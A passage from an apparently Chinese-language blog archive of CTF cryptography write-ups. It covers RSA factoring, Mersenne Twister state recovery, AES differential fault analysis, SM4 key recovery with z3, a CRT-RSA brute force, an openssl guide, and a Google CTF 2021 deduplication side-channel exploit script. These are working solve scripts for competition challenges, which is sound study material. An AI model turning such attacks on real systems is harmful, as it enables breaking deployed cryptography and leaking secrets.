= getab(n,x,lenth) from icecream import * ic(a,b) 倒序exp\ndef get_cd(n,x,lenth): p_low = [0] q_high = [0] q_low = [0] p_high = [0] # maskn = 2 maskn = 0 for i in range(lenth//2): maskn = 2**(i+1)-1 xi = (x \u0026gt;\u0026gt; i )\u0026amp;1 n_lowbits = (n \u0026amp; maskn) # 高位判断从lenth-1处开始 High_index = lenth-1 -i XHi = (x \u0026gt;\u0026gt; (High_index))\u0026amp;1 n_highbits = (n)\u0026gt;\u0026gt; (High_index) *2 nextP_l = [] nextQ_l = [] nextP_h =[] nextQ_h =[] for j in range(len(p_low)): for pl in range(2): for ql in range(2): for ph in range(2): for qh in range(2): if pl ^ qh == xi and ql ^ ph == XHi: PlxQl = (((pl\u0026lt;\u0026lt;i) + p_low[j]) * ((ql\u0026lt;\u0026lt;i) + q_low[j])) \u0026amp; maskn PhxQh = (((ph \u0026lt;\u0026lt; (High_index)) + p_high[j]) * ((qh \u0026lt;\u0026lt; (High_index)) + q_high[j]))\u0026gt;\u0026gt;(High_index)*2 if PlxQl == n_lowbits : # if n_highbits-PhxQh \u0026gt;= 0 and n_highbits-PhxQh \u0026lt;=((2\u0026lt;\u0026lt;i+1)-1) # 高n位的差在 2^(i+1)-1以内是 高位相同的必要条件 if n_highbits-PhxQh \u0026gt;= 0 and n_highbits-PhxQh \u0026lt;=((2\u0026lt;\u0026lt;i+1)-1): nextP_l.append((pl\u0026lt;\u0026lt;i) + p_low[j]) nextQ_l.append((ql\u0026lt;\u0026lt;i) + q_low[j]) nextP_h.append((ph\u0026lt;\u0026lt;(High_index))+p_high[j]) nextQ_h.append((qh\u0026lt;\u0026lt;(High_index))+q_high[j]) p_low = nextP_l q_low = nextQ_l p_high = nextP_h q_high = nextQ_h for a in p_low: for b in p_high: if n %(a+b) ==0: p = a + b q = n//p print(p,q) break n2 = 65288148454377101841888871848806704694477906587010755286451216632701868457722848139696036928561888850717442616782583309975714172626476485483361217174514747468099567870640277441004322344671717444306055398513733053054597586090074921540794347615153542286893272415931709396262118416062887003290070001173035587341 x2 =3604386688612320874143532262988384562213659798578583210892143261576908281112223356678900083870327527242238237513170367660043954376063004167228550592110478 lenth = 512 get_cd(n2,x2,lenth) # ic(p,q) 稍微改了一下原p阴间的位运算\nn1ctf2021 # 咕咕咕了好久\nvss # 难点在随机数预测上面 先使用了一个二维码生成\nqr = qrcode.QRCode( version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=12, border=4, ) qr.add_data(FLAG) qr.make(fit=True) img = qr.make_image(fill_color=\u0026#34;black\u0026#34;, back_color=\u0026#34;white\u0026#34;) RGB = 0xffffff 是白色\nRGB = 0 是黑色\n在填充像素时\n当 pixel !=255 时填充在 2x, 2y 的 color会不一样\n若能获得一大段连续的一样的pixel ，只要通过判断n个连续 color0 / color1的值就可以恢复出随机数MT9937的当前状态，不管是向前还是向后推都可以得到加密图片使用的随机数\nif pixel: ... else: share1.putpixel((2*x, 2*y), color0) share1.putpixel((2*x, 2*y+1), color0) ... share2.putpixel((2*x, 2*y), color1) share2.putpixel((2*x, 2*y+1), color1) ... exp\nfrom PIL import Image from randcrack import RandCrack import random share = Image.open(\u0026#39;./share2.png\u0026#39;) width = share.size[0]//2 res = Image.new(\u0026#39;L\u0026#39;, (width, width)) bits = \u0026#39;\u0026#39; # pixel为1填充0 # pixel为0填充1 # 01分别对应的是黑色的填充和白色的背景像素 # 官p取最后一段连续白色 for idx in range(width*width-624*32, width*width): i, j = idx//width, idx % width if share.getpixel((2*j, 2*i)) == 255: bits += \u0026#39;0\u0026#39; else: bits += \u0026#39;1\u0026#39; # 判断像素后 rc = RandCrack() for i in range(len(bits), 0, -32): rc.submit(int(bits[i-32:i], 2)) flipped_coins = [int(bit) for bit in bin(rc.predict_getrandbits(width*width-624*32))[2:].zfill(width*width-624*32)] + list(map(int, bits)) data = [] for idx in range(width*width): i, j = idx//width, idx % width if share.getpixel((2*j, 2*i)) == 255: data.append(0 if flipped_coins[idx] else 255) else: data.append(255 if flipped_coins[idx] else 0) res.putdata(data) res.save(\u0026#39;ans.png\u0026#39;) CISCN 2021 oddaes # 标准的远古时代的aes差分分析，做出来的估计互通有无得比较厉害\n市面上能搜到的aes差分脚本有三种，只有一种是专门针对这个题的\n能现学现找到的都是智商160+的超人😅😅😅\n感谢ChaMd5让本菜鸡学习了该脚本的用法\n暂且不论为什么社会安全团体会参加大学生赛事\nDifferential Fault Analysis（DFA） # 先来简单了解一下FDA是个啥\nDifferential fault analysis (DFA) is a type of active side-channel attack in the field of cryptography, specifically cryptanalysis. The principle is to induce faults—unexpected environmental conditions—into cryptographic implementations, to reveal their internal states.\nFor example, a smartcard containing an embedded processor might be subjected to high temperature, unsupported supply voltage or current, excessively high overclocking, strong electric or magnetic fields, or even ionizing radiation to influence the operation of the processor. The processor may begin to output incorrect results due to physical data corruption, which may help a cryptanalyst deduce the instructions that the processor is running, or what its internal data state is.\nFor DES and Triple DES, about 200 single-flipped bits are necessary to obtain a secret key.DFA was also applied successfully to the AES cipher.\n简单地说就是向密码系统内引入一定的错误，体现为加入以下细小的变化，使其与标准加密相比会有所不同。\n实验情况为手动加入错误，现实情况可能是由天气温度等物理因素导致的以外情况\n对des、3des而言约两百个单翻转位就足以获取到其密钥\n可以理解为我们使用两套不一样的加密系统加密了同一套明文，而两套加密系统的不同是已知的且微小的，通过对密文分析，有几率得到密钥\nanalysis and implement # https://eprint.iacr.org/2009/575.pdf\nAbstract. In this paper we present a differential fault attack that can be applied to the AES using a single fault. We demonstrate that when a single random byte fault is induced at the input of the eighth round, the AES key can be deduced using a two stage algorithm.\n在这篇文章中介绍了针对第八轮的输入中引发单个随机字节错误时，可以使用两阶段算法推导出 AES 密钥的算法（其实后面正式attack👴一个字都没看）\nConclusion\nthese attacks can be conducted without any knowledge of the plaintext being enciphered, as an attacker would just need to know the plaintexts were the same\n好了，那么我们可以发现题目给出的情况和论文中的情况是一模一样的🙄🙄🙄\ndef encrypt_block(self, plaintext): \u0026#34;\u0026#34;\u0026#34; Encrypts a single block of 16 byte long plaintext. \u0026#34;\u0026#34;\u0026#34; assert len(plaintext) == 16 plain_state = bytes2matrix(plaintext) add_round_key(plain_state, self._key_matrices[0]) for i in range(1, self.n_rounds): sub_bytes(plain_state) shift_rows(plain_state) mix_columns(plain_state) add_round_key(plain_state, self._key_matrices[i]) sub_bytes(plain_state) shift_rows(plain_state) add_round_key(plain_state, self._key_matrices[-1]) return matrix2bytes(plain_state) def encrypt_block_(self, plaintext,bytee): \u0026#34;\u0026#34;\u0026#34; Encrypts a single block of 16 byte long plaintext. \u0026#34;\u0026#34;\u0026#34; assert len(plaintext) == 16 plain_state = bytes2matrix(plaintext) add_round_key(plain_state, self._key_matrices[0]) for i in range(1, self.n_rounds): # 故意在第八轮中手动加入了差错。。。。 if i==8: plain_state[0][0] ^= bytee sub_bytes(plain_state) shift_rows(plain_state) mix_columns(plain_state) add_round_key(plain_state, self._key_matrices[i]) sub_bytes(plain_state) shift_rows(plain_state) add_round_key(plain_state, self._key_matrices[-1]) keym = self._key_matrices[-1] return matrix2bytes(plain_state),keym[0]+keym[1]+keym[2]+keym[3] https://github.com/Daeinar/dfa-aes\n直接把这个库里面的example1的input-1.csv两段密文换成题目给出的密文就可以得到一堆matter keys，把所有matter keys拿进去遍历就得到key了\ncsv的文件结构和txt基本一样\nfrom aes import AES import os,hashlib,random from tqdm import tqdm # ----------------------------------- f = open(\u0026#39;keys-0.csv\u0026#39;,\u0026#39;r\u0026#39;) plain = os.urandom(16) m1 = \u0026#39;973f5ae78bc933a8fc7f7ab98d53d16f\u0026#39; m2 = \u0026#39;628aab012199cdab83cc1aa72204ea98\u0026#39; s = random.randint(0,255) for i in tqdm(range(4266)): key = f.readline().replace(\u0026#39;\\n\u0026#39;,\u0026#39;\u0026#39;) cipher,k = AES(bytes.fromhex(key)).encrypt_block_(plain,s) piece1 = [k[0],k[1],k[4],k[7],k[10],k[11],k[13],k[14]] m11 = hashlib.md5(bytes(piece1)).hexdigest() piece2 = [k[2],k[3],k[5],k[6],k[8],k[9],k[12],k[15]] m22 = hashlib.md5(bytes(piece2)).hexdigest() if m11 == m1 and m22 == m2: print(key) print(\u0026#34;CISCN{\u0026#34;+hashlib.md5(bytes.fromhex(key)).hexdigest()+\u0026#34;}\u0026#34;) break 癫疯极客2021补档 7-31 # 东拼西凑把wp凑齐了🙄\nlearnSM4 # SM4采用和aes完全不同的结构\n列如在第一轮中，使用原有明文生$X_0X_1X_2X_3$成新的明文$X_4$\n在$n$轮后选取最后四个$X$作为密文\n这里故意加入leak可以在第一轮和第二轮泄露用$X_0X_1X_2X_3$生成的$X_4$\ndef _crypthack(num, mk, rou,index): x_keys = list(_byte_unpack(num, byte_n=16)) round_keys = _round_keys(mk) leak = 0 for i in _range(32): reg = _round_f(x_keys[i:i+4], round_keys[i]) x_keys.append(reg) # use x0123 get x4 reg = _byte_unpack(reg) if i == rou: leak = reg[index] return _byte_pack(x_keys[-4:][::-1], byte_n=16),leak 生成公式如下\n$X_4=repT(X_1\\oplus X_2\\oplus X_3\\oplus roundKey)$\ndef _round_f(byte4_array, rk): x0, x1, x2, x3 = byte4_array print(x0, x1, x2, x3) return x0 ^ _rep_t(x1 ^ x2 ^ x3 ^ rk) 也就是说找到$repT$的逆算法就能求roundKey[0]了\n然后就陷入了僵局。。写半天局部爆破每弄出来\n事后发现有人用z3直接梭哈。。。\n构造$X_4=1\\oplus repT(0\\oplus 0\\oplus 0\\oplus roundKey)$\n依次输入r = 0 i=0~3 msg=0000001000000000000000000000000\nimport z3 S_BOX = { 0X00: 0XD6, 0X01: 0X90, 0X02: 0XE9, 0X03: 0XFE, 0X04: 0XCC, 0X05: 0XE1, 0X06: 0X3D, 0X07: 0XB7, 0X08: 0X16, 0X09: 0XB6, 0X0A: 0X14, 0X0B: 0XC2, 0X0C: 0X28, 0X0D: 0XFB, 0X0E: 0X2C, 0X0F: 0X05, 0X10: 0X2B, 0X11: 0X67, 0X12: 0X9A, 0X13: 0X76, 0X14: 0X2A, 0X15: 0XBE, 0X16: 0X04, 0X17: 0XC3, 0X18: 0XAA, 0X19: 0X44, 0X1A: 0X13, 0X1B: 0X26, 0X1C: 0X49, 0X1D: 0X86, 0X1E: 0X06, 0X1F: 0X99, 0X20: 0X9C, 0X21: 0X42, 0X22: 0X50, 0X23: 0XF4, 0X24: 0X91, 0X25: 0XEF, 0X26: 0X98, 0X27: 0X7A, 0X28: 0X33, 0X29: 0X54, 0X2A: 0X0B, 0X2B: 0X43, 0X2C: 0XED, 0X2D: 0XCF, 0X2E: 0XAC, 0X2F: 0X62, 0X30: 0XE4, 0X31: 0XB3, 0X32: 0X1C, 0X33: 0XA9, 0X34: 0XC9, 0X35: 0X08, 0X36: 0XE8, 0X37: 0X95, 0X38: 0X80, 0X39: 0XDF, 0X3A: 0X94, 0X3B: 0XFA, 0X3C: 0X75, 0X3D: 0X8F, 0X3E: 0X3F, 0X3F: 0XA6, 0X40: 0X47, 0X41: 0X07, 0X42: 0XA7, 0X43: 0XFC, 0X44: 0XF3, 0X45: 0X73, 0X46: 0X17, 0X47: 0XBA, 0X48: 0X83, 0X49: 0X59, 0X4A: 0X3C, 0X4B: 0X19, 0X4C: 0XE6, 0X4D: 0X85, 0X4E: 0X4F, 0X4F: 0XA8, 0X50: 0X68, 0X51: 0X6B, 0X52: 0X81, 0X53: 0XB2, 0X54: 0X71, 0X55: 0X64, 0X56: 0XDA, 0X57: 0X8B, 0X58: 0XF8, 0X59: 0XEB, 0X5A: 0X0F, 0X5B: 0X4B, 0X5C: 0X70, 0X5D: 0X56, 0X5E: 0X9D, 0X5F: 0X35, 0X60: 0X1E, 0X61: 0X24, 0X62: 0X0E, 0X63: 0X5E, 0X64: 0X63, 0X65: 0X58, 0X66: 0XD1, 0X67: 0XA2, 0X68: 0X25, 0X69: 0X22, 0X6A: 0X7C, 0X6B: 0X3B, 0X6C: 0X01, 0X6D: 0X21, 0X6E: 0X78, 0X6F: 0X87, 0X70: 0XD4, 0X71: 0X00, 0X72: 0X46, 0X73: 0X57, 0X74: 0X9F, 0X75: 0XD3, 0X76: 0X27, 0X77: 0X52, 0X78: 0X4C, 0X79: 0X36, 0X7A: 0X02, 0X7B: 0XE7, 0X7C: 0XA0, 0X7D: 0XC4, 0X7E: 0XC8, 0X7F: 0X9E, 0X80: 0XEA, 0X81: 0XBF, 0X82: 0X8A, 0X83: 0XD2, 0X84: 0X40, 0X85: 0XC7, 0X86: 0X38, 0X87: 0XB5, 0X88: 0XA3, 0X89: 0XF7, 0X8A: 0XF2, 0X8B: 0XCE, 0X8C: 0XF9, 0X8D: 0X61, 0X8E: 0X15, 0X8F: 0XA1, 0X90: 0XE0, 0X91: 0XAE, 0X92: 0X5D, 0X93: 0XA4, 0X94: 0X9B, 0X95: 0X34, 0X96: 0X1A, 0X97: 0X55, 0X98: 0XAD, 0X99: 0X93, 0X9A: 0X32, 0X9B: 0X30, 0X9C: 0XF5, 0X9D: 0X8C, 0X9E: 0XB1, 0X9F: 0XE3, 0XA0: 0X1D, 0XA1: 0XF6, 0XA2: 0XE2, 0XA3: 0X2E, 0XA4: 0X82, 0XA5: 0X66, 0XA6: 0XCA, 0XA7: 0X60, 0XA8: 0XC0, 0XA9: 0X29, 0XAA: 0X23, 0XAB: 0XAB, 0XAC: 0X0D, 0XAD: 0X53, 0XAE: 0X4E, 0XAF: 0X6F, 0XB0: 0XD5, 0XB1: 0XDB, 0XB2: 0X37, 0XB3: 0X45, 0XB4: 0XDE, 0XB5: 0XFD, 0XB6: 0X8E, 0XB7: 0X2F, 0XB8: 0X03, 0XB9: 0XFF, 0XBA: 0X6A, 0XBB: 0X72, 0XBC: 0X6D, 0XBD: 0X6C, 0XBE: 0X5B, 0XBF: 0X51, 0XC0: 0X8D, 0XC1: 0X1B, 0XC2: 0XAF, 0XC3: 0X92, 0XC4: 0XBB, 0XC5: 0XDD, 0XC6: 0XBC, 0XC7: 0X7F, 0XC8: 0X11, 0XC9: 0XD9, 0XCA: 0X5C, 0XCB: 0X41, 0XCC: 0X1F, 0XCD: 0X10, 0XCE: 0X5A, 0XCF: 0XD8, 0XD0: 0X0A, 0XD1: 0XC1, 0XD2: 0X31, 0XD3: 0X88, 0XD4: 0XA5, 0XD5: 0XCD, 0XD6: 0X7B, 0XD7: 0XBD, 0XD8: 0X2D, 0XD9: 0X74, 0XDA: 0XD0, 0XDB: 0X12, 0XDC: 0XB8, 0XDD: 0XE5, 0XDE: 0XB4, 0XDF: 0XB0, 0XE0: 0X89, 0XE1: 0X69, 0XE2: 0X97, 0XE3: 0X4A, 0XE4: 0X0C, 0XE5: 0X96, 0XE6: 0X77, 0XE7: 0X7E, 0XE8: 0X65, 0XE9: 0XB9, 0XEA: 0XF1, 0XEB: 0X09, 0XEC: 0XC5, 0XED: 0X6E, 0XEE: 0XC6, 0XEF: 0X84, 0XF0: 0X18, 0XF1: 0XF0, 0XF2: 0X7D, 0XF3: 0XEC, 0XF4: 0X3A, 0XF5: 0XDC, 0XF6: 0X4D, 0XF7: 0X20, 0XF8: 0X79, 0XF9: 0XEE, 0XFA: 0X5F, 0XFB: 0X3E, 0XFC: 0XD7, 0XFD: 0XCB, 0XFE: 0X39, 0XFF: 0X48 } def getnum(arr): HEX = \u0026#39;\u0026#39; for i in arr: HEX += hex(i)[2:] return int(HEX,16) # 用z3逆T变换中的r(x) def f(B): B1 = (((B \u0026lt;\u0026lt; 2 ) \u0026amp; 0b1100000000000000000000000000000000) \u0026gt;\u0026gt;32) ^ (B \u0026lt;\u0026lt; 2) \u0026amp; 0xffffffff B2 = (((B \u0026lt;\u0026lt; 10) \u0026amp; 0b111111111100000000000000000000000000000000) \u0026gt;\u0026gt; 32) ^ (B\u0026lt;\u0026lt;10) \u0026amp; 0xffffffff B3 = (((B \u0026lt;\u0026lt; 18) \u0026amp; 0b11111111111111111100000000000000000000000000000000) \u0026gt;\u0026gt; 32) ^ (B\u0026lt;\u0026lt;18) \u0026amp; 0xffffffff B4 = (((B \u0026lt;\u0026lt; 24) \u0026amp; 0b11111111111111111111111100000000000000000000000000000000) \u0026gt;\u0026gt; 32) ^ (B\u0026lt;\u0026lt;24) \u0026amp; 0xffffffff return B ^ B1 ^ B2 ^ B3 ^ B4 S = z3.Solver() x = z3.BitVec(\u0026#39;x\u0026#39;,64) # 四次获取的x4 S.add((getnum([173,171,64,87])^1)- f(x)==0) if S.check(): print(S.model()) # [x = 2810370552] print(hex(2810370552)[2:]) # 0x842586b9 key = \u0026#39;0\u0026#39; arr = [0xa7,0x82,0xd9,0xf8] for i in arr: key += hex(findS(i))[2:] print(int(key,16)) crtrsa # 没这么看这个，看完wp的爆破感觉智商收到了侮辱。。\nfrom gmpy2 import * from Crypto.Util.number import * from tqdm import tqdm from rich.progress import track from rich.traceback import install install() # ----------------------------------- N = 6006128121276172470274143101473619963750725942458450119252491144009018469845917986523007748831362674341219814935241703026024431390531323127620970750816983 e = 2953544268002866703872076551930953722572317122777861299293407053391808199220655289235983088986372630141821049118015752017412642148934113723174855236142887 c=4082777468662493175049853412968913980472986215497247773911290709560282223053863513029985115855416847643274608394467813391117463817805000754191093158289399 a=2 A=powmod(a,e,N) for dp in tqdm(range(1,2**20)): if gcd(powmod(A,dp,N)-a,N)!=1 and gcd(powmod(A,dp,N)-a,N)!=N: p=gcd(pow(A,dp,N)-a,N) q=N//p phi=(p-1)*(q-1) d=invert(e,phi) m=pow(c,d,N) print(long_to_bytes(m)) break 抄，我疯狂抄\n","date":"9 August 2021","permalink":"/achieve/%E5%A4%8D%E7%9B%981/","section":"archive","summary":"","title":"闲题杂记"},{"content":"采用的原因：早期的图像加密方法主要基于现有的数据加密技术，如DES、AES等。然而，由于图像本身的固有特性，这些方法的效率和抗攻击能力都较弱。近年来，基于混沌的图像加密方法越来越受到重视。与传统的非混沌图像加密相比，基于混沌的图像加密具有密钥空间大、速度快、易于实现等优点\n图像文件加密与普通文件加密的不同之处在于，图像相邻像素之间通常存在着比较大的相关性，对图像加密不仅要使图像变得不可识别，还要尽可能地减小相邻像素之间的相关性。\n虫口模型 Logistic 混沌映射 # 如果一个系统的演变过程对初始的状态十分敏感，就把这个系统称为是混沌系统。\n在本文中，我们主要探讨一维Logistic映射的一些特性\n一维Logistic映射从数学形式上来看是一个非常简单的混沌映射，早在20世纪50年代，有好几位生态学家就利用过这个简单的差分方程，来描述种群的变化。此系统具有极其复杂的动力学行为，在保密通信领域的应用十分广泛，其数学表达公式如下：\n$X_{n+1}=X_n \\times \\mu \\times (1-X_n)$\n$\\mu \\in[0,4];X\\in[0,1]$\n其中$\\mu$被称为Logistic参数。研究表明，当$X\\in[0,1]$时，Logistic 映射工作处于混沌状态，\n也就是说，有初始条件$X_n$在Logistic映射作用下产生的序列是非周期的、不收敛的，而在此范围之外，生成的序列必将收敛于某一个特定的值\n可以看出，在μ的取值符合3.5699456\u0026lt;μ\u0026lt;=4的条件，特别是比较靠近4时，迭代生成的值是出于一种伪随机分布的状态，而在其他取值时，在经过一定次数的迭代之后，生成的值将收敛到一个特定的数值，这对于我们来说是不可接受的。\n下图中描述了X0值一定时，对于不同的μ的取值，迭代可能得到的值：\n图中的点即表明了所有可能的X取值范围。从图中我们可以看出，在μ越接近4的地方，X取值范围越是接近平均分布在整个0到1的区域，因此我们需要选取的Logistic控制参数应该越接近4越好。当3.5699456\u0026hellip;\u0026lt;μ≤43.5699456\u0026hellip;\u0026lt;μ≤4时，映射进入混沌(chaos)区域。Logistic映射分岔图像如图1所示。现在这类模型是人们最常见的，更是广为使用的。\n在μ的值确定之后，我们再来看看初始值X0对整个系统的影响。刚才也说过了，混沌系统在初始值发生很小变化时，得到的结构就会大相径庭，在Logistic混沌映射中也是如此。\n一种像素灰度值替代设计图像加密 # 设图像$(i,j)$处的灰度值为 $I(i,j)$,$I\u0026rsquo;(i,j)$表示替换后的值\n本文中，像素值的替代变换是在空域中进行的，一般，设计了两种思路用于实现混沌序列与像素值的替换操作。\n$I′(i,j)=((r1(i,j)⊕I(i,j)⊕r2(i,j)+L−r3(i,j)));mod;L);mod;256$\n$L$表示图像的颜色深度\n$r1,r2,r3$表示的是混沌序列值，替换变换的密钥由$r1,r2,r3$对应的混沌系统提供，变换可多次进行，如此加密效果更好。设重复次数为 n ，与混沌模型的初值和参数共同作为这一部分的密钥，增大了密钥的空间\n若图像很大时，通过上式能够看出r1,r2,r3模版矩阵需要随之增大，如此就大大减小了加密效率。为此，我们可以通过分块处理的方式对图像进行加密，加密效率明显提高。图2是原始图像和加密后的图像:\n混沌理论Chaos theory # Chaos theory is a branch of mathematics focusing on the study of chaos — dynamical systems whose apparently random states of disorder and irregularities are actually governed by underlying patterns and deterministic laws that are highly sensitive to initial conditions\n大意是混沌系统是数学的一个分支\n这里利用一些自然中对初始条件及其敏感的模型来输出加密序列？\n","date":"31 July 2021","permalink":"/achieve/2019to2021/chaostc/","section":"archive","summary":"","title":"Chaos encrypt system"},{"content":"\ropenssl基本使用指北 # 鉴于网上能找到的都写得像shit一样\n求人不如求己了属于是\nrsa # rsa pem密钥文件有 $n,p,q,dp,dq,e,d,[p^{-1}]_q$\n所有参数\n私钥\nopenssl rsa -in ./akey.pem -text 公钥\nopenssl rsa -in ./akey.pem -text -pubin 生成\nopenssl genrsa \u0026gt; key.pem openssl genrsa -out privkey.pem 2048 ecc # ec 密钥文件有参数\n曲线：$a,b,p,生成元G，阶数N$\n密钥：$私钥d，公钥P=d*G$\n提取\nopenssl ec -in ./p384-key.pem -text 提取csr证书 # openssl req -new -key privkey.pem -out ca.csr\n提取密钥信息 # 公私钥模数 # openssl rsa -in .\\pubkey.pem -pubout -modulus\nopenssl rsa -in .\\pubkey.pem -pubin -modulus\n提取所有信息 # openssl asn1parse -i -in privkey.pem\n公钥要指定偏移查看，bit string的偏移是19\nopenssl asn1parse -i -in .\\pubkey.pem -strparse 19\npem、der格式转化 # openssl rsa -in .\\private.pem -outform der -out .\\private.der\n除了生孩子什么都能干的python # crypto yyds\nfrom Crypto.PublicKey import RSA\n读取公钥信息 # rsakey = RSA.importKey(open(\u0026#34;public.key\u0026#34;, \u0026#34;r\u0026#34;).read()) n = rsakey.n e = rsakey.e print(\u0026#34;n=%\\ne=%d\u0026#34;,n,e) 生成秘钥对文件 # rsa = RSA.generate(2048) public_key = rsa.publickey().exportKey() f = open(\u0026#34;public_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(public_key.decode()) f.close() private_key = rsa.exportKey() f = open(\u0026#34;private_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(private_key.decode()) f.close() 对文件加解密 # 载入填充方式\nfrom Crypto.Cipher import PKCS1_OAEP\nrsakey=RSA.importKey(open(\u0026#34;public_key.key\u0026#34;,\u0026#34;r\u0026#34;).read()) rsa = PKCS1_OAEP.new(rsakey) encrypt = rsa.encrypt(flag.encode()) rsakey=RSA.importKey(open(\u0026#34;private_key.key\u0026#34;,\u0026#34;r\u0026#34;).read()) rsa = PKCS1_OAEP.new(rsakey) decrypt = rsa.decrypt(f.read()) 生成 private_key.key # rsa_components = (n, e, int(d), p, q) rsa = RSA.construct(rsa_components) public_key = rsa.exportKey() # 此rsa与上文随机生成的rsa相同 f = open(\u0026#34;public_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(public_key.decode()) f.close() ","date":"27 July 2021","permalink":"/achieve/2019to2021/openssl/","section":"archive","summary":"","title":"openssl/pem"},{"content":"\r[toc]\ngoogle 的题真的太有意思了，可惜自己做出来的就只有这一个😥😥😥 有时间看看AESGCM怎么Oracle的\nFILESTORE # TASK\n# Copyright 2021 Google LLC # # Licensed under the Apache License, Version 2.0 (the \u0026#34;License\u0026#34;); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # https://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an \u0026#34;AS IS\u0026#34; BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. import os, secrets, string, time # from flag import flag flag = \u0026#39;CTF{CR1M3_0f_d3dup1ic4ti0n}\u0026#39; def main(): # It\u0026#39;s a tiny server... blob = bytearray(2**16) files = {} used = 0 # Use deduplication to save space. def store(data): nonlocal used MINIMUM_BLOCK = 16 MAXIMUM_BLOCK = 1024 part_list = [] while data: prefix = data[:MINIMUM_BLOCK] ind = -1 bestlen, bestind = 0, -1 while True: ind = blob.find(prefix, ind+1) if ind == -1: break length = len(os.path.commonprefix([data, bytes(blob[ind:ind+MAXIMUM_BLOCK])])) if length \u0026gt; bestlen: bestlen, bestind = length, ind if bestind != -1: part, data = data[:bestlen], data[bestlen:] part_list.append((bestind, bestlen)) else: part, data = data[:MINIMUM_BLOCK], data[MINIMUM_BLOCK:] blob[used:used+len(part)] = part part_list.append((used, len(part))) used += len(part) assert used \u0026lt;= len(blob) fid = \u0026#34;\u0026#34;.join(secrets.choice(string.ascii_letters+string.digits) for i in range(16)) files[fid] = part_list return fid def load(fid): # print(files) data = [] for ind, length in files[fid]: data.append(blob[ind:ind+length]) return b\u0026#34;\u0026#34;.join(data) print(\u0026#34;Welcome to our file storage solution.\u0026#34;) # Store the flag as one of the files. store(bytes(flag, \u0026#34;utf-8\u0026#34;)) while True: print() print(\u0026#34;Menu:\u0026#34;) print(\u0026#34;- load\u0026#34;) print(\u0026#34;- store\u0026#34;) print(\u0026#34;- status\u0026#34;) print(\u0026#34;- exit\u0026#34;) choice = input().strip().lower() if choice == \u0026#34;load\u0026#34;: print(\u0026#34;Send me the file id...\u0026#34;) fid = input().strip() data = load(fid) print(data.decode()) elif choice == \u0026#34;store\u0026#34;: print(\u0026#34;Send me a line of data...\u0026#34;) data = input().strip() fid = store(bytes(data, \u0026#34;utf-8\u0026#34;)) print(\u0026#34;Stored! Here\u0026#39;s your file id:\u0026#34;) print(fid) elif choice == \u0026#34;status\u0026#34;: print(\u0026#34;User: ctfplayer\u0026#34;) print(\u0026#34;Time: %s\u0026#34; % time.asctime()) kb = used / 1024.0 print(len(blob)) kb_all = len(blob) / 1024.0 print(\u0026#34;Quota: %0.3fkB/%0.3fkB\u0026#34; % (kb, kb_all)) print(\u0026#34;Files: %d\u0026#34; % len(files)) elif choice == \u0026#34;exit\u0026#34;: break else: print(\u0026#34;Nope.\u0026#34;) try: main() except Exception: print(\u0026#34;Nope.\u0026#34;) time.sleep(1) 设计了一个字符串储存系统,会复用flag的字符串来达到减少内存的目的,观察内存可以判断输入的字符串是否位flag的子字符串\nb\u0026#39;COqrVqqo621exq2q\\n\u0026#39; b\u0026#39;\\nMenu:\\n- load\\n- store\\n- status\\n- exit\\n\u0026#39; ic| flag_: \u0026#39;CTF{CR1M3_0f_d3d0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d2\u0026#39; ic| mome: 0.041, base: 0.036 b\u0026#39;\\nFiles: 4\\n\\nMenu:\\n- load\\n- store\\n- status\\n- exit\\n\u0026#39; b\u0026#39;Send me a line of data...\\n\u0026#39; b\u0026#34;Stored! Here\u0026#39;s your file id:\\n\u0026#34; b\u0026#39;a6m4SqnnLQPIYEIx\\n\u0026#39; b\u0026#39;\\nMenu:\\n- load\\n- store\\n- status\\n- exit\\n\u0026#39; ic| flag_: \u0026#39;CTF{CR1M3_0f_d3d0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d3dup1ic4ti0n0f_d3\u0026#39; ic| mome: 0.041, base: 0.041 [*] Closed connection to 0.0.0.0 port 10001 [◐] Opening connection to 0.0.0.0 on port 10001: Done Traceback (most recent call last): exp\nflag_len = 26 import io from pwn import * from string import printable from MyRE import CatData host = \u0026#39;filestore.2021.ctfcompetition.com\u0026#39; prot= 1337 # flag=\u0026#39;CTF{CR1M3_0f_d3dup1ic4ti0n}\u0026#39; flag =\u0026#39;CTF\u0026#39; tab = \u0026#39;`{|}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\u0026#34;#$%\u0026amp;\\\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\\\]^_`~ \\t\\n\\r\\x0b\\x0c\u0026#39; def getmome(): print(io.recvuntil(\u0026#39;exit\\n\u0026#39;)) io.sendline(\u0026#39;status\u0026#39;) buf = io.recvuntil(\u0026#39;/64.000kB\u0026#39;) mome = float(CatData(buf,\u0026#39;Quota: \u0026#39;,\u0026#39;kB\u0026#39;)[0]) return mome def sendpayload(flag_): print(io.recvuntil(\u0026#39;exit\\n\u0026#39;)) io.sendline(\u0026#39;store\u0026#39;) print(io.recvline()) io.sendline(flag_) print(io.recvline()) id = io.recvline() print(id) # flag1 = \u0026#39;CTF123123\u0026#39; for i in range(100): io = remote(host, prot) base = getmome() for ch in printable: flag_ = flag+ch sendpayload(flag_) mome = getmome() from icecream import * ic(flag_) ic(mome,base) if(mome\u0026gt;base): base = mome else: flag = flag +ch io.close() break # flag1 = \u0026#39;{CR1M3_0f_d3dup1ic4ti0n}\u0026#39; 验证子序列的地方又一点问题，需要自行截断\n","date":"18 July 2021","permalink":"/achieve/ctf/google2021/","section":"archive","summary":"","title":"Google CTF 2021"},{"content":"\r2021第五届强网杯网络安全挑战赛决赛-crypto writeup # 第一次打强网杯，不垫底就算成功🐼🐼🐼\n蛮恶心的，差点因为服务器太慢出不来\nfrom sage.stats.distributions.discrete_gaussian_integer import DiscreteGaussianDistributionIntegerSampler from random import randint, getrandbits from secret import flag import sys import signal q = 2 ^ 54 t = 83 T = 3 d = 1024 delta = int(q / t) sigma 